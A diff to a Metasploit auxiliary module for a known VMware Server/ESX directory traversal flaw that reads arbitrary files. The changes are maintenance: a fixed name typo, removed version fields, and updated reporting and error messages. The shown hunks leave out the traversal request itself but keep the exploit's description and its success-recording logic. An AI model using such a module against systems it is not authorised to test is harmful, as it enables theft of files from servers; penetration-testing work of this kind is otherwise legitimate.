@@ -1,12 +1,8 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 require 'msf/core'
@@ -21,9 +17,8 @@ class Metasploit3 < Msf::Auxiliary
 
 	def initialize
 		super(
-			'Name'        => 'VMware Server Directory Transversal Vulnerability',
-			'Version'     => '$Revision$',
-			'Description' => 'This modules exploits the VMware Server Directory traversal
+			'Name'        => 'VMware Server Directory Traversal Vulnerability',
+			'Description' => 'This modules exploits the VMware Server Directory Traversal
 				vulnerability in VMware Server 1.x before 1.0.10 build 203137 and 2.x before
 				2.0.2 build 203138 on Linux, VMware ESXi 3.5, and VMware ESX 3.0.3 and 3.5
 				allows remote attackers to read arbitrary files. Common VMware server ports
@@ -31,7 +26,6 @@ class Metasploit3 < Msf::Auxiliary
 				the gueststealer tool.',
 			'Author'      => 'CG' ,
 			'License'     => MSF_LICENSE,
-			'Version'     => '$Revision$',
 			'References'	=>
 				[
 					[ 'URL', 'http://www.vmware.com/security/advisories/VMSA-2009-0015.html' ],
@@ -68,18 +62,18 @@ class Metasploit3 < Msf::Auxiliary
 						:host   => target_host,
 						:port	=> rport,
 						:proto  => 'tcp',
-						:name	=> self.fullname,
-						:info   => res.code,
+						:name	=> self.name,
+						:info   => "Module #{self.fullname} reports directory traversal of #{target_host}:#{rport} with response code #{res.code}",
 						:refs   => self.references,
 						:exploited_at => Time.now.utc
 					}
 				)
 			else
-				''
-				#print_status("Received #{res.code} for #{trav}#{file}")
+				vprint_status("Received #{res.code} for #{trav}#{file}")
 			end
 
-		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
+		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout => e
+			print_error(e.message)
 		rescue ::Timeout::Error, ::Errno::EPIPE
 		end
 	end
